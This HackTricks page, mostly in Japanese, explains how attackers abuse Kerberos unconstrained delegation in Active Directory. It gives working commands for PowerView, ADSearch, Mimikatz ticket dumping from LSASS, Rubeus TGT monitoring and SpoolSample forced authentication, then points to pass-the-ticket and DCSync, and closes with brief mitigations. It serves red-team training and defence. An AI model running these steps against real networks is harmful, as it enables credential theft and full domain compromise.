# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。次に、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**がDCによって提供される**TGS内に送信され**、**LSASSのメモリに保存されます**。したがって、マシン上で管理者権限を持っている場合、**チケットをダンプしてユーザーを偽装する**ことができます。

したがって、ドメイン管理者が「制約のない委任」機能が有効なコンピュータにログインし、そのマシン内でローカル管理者権限を持っている場合、チケットをダンプしてドメイン管理者をどこでも偽装することができます（ドメイン特権昇格）。

この属性を持つコンピュータオブジェクトを**見つけることができます**。これは、[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性が[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)を含んでいるかどうかを確認することで行います。これは、LDAPフィルター‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’を使用して行うことができ、これがpowerviewが行うことです：

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

**Mimikatz**または**Rubeus**を使用して、管理者（または被害者ユーザー）のチケットをメモリにロードします。**[Pass the Ticket](pass-the-ticket.md)**。\
詳細情報：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**制約のない委任に関する詳細情報はired.teamにあります。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

攻撃者が「制約のない委任」を許可されたコンピュータを**侵害することができれば**、彼は**プリントサーバー**を**自動的にログイン**させて**TGTをメモリに保存**させることができます。\
その後、攻撃者は**チケットをパスする攻撃を実行して**、ユーザーのプリントサーバーコンピュータアカウントを偽装することができます。

プリントサーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**ここに認証を強制するための他の方法があります：**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigation

* DA/Adminのログインを特定のサービスに制限する
* 特権アカウントに対して「アカウントは機密であり、委任できません」を設定する。

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
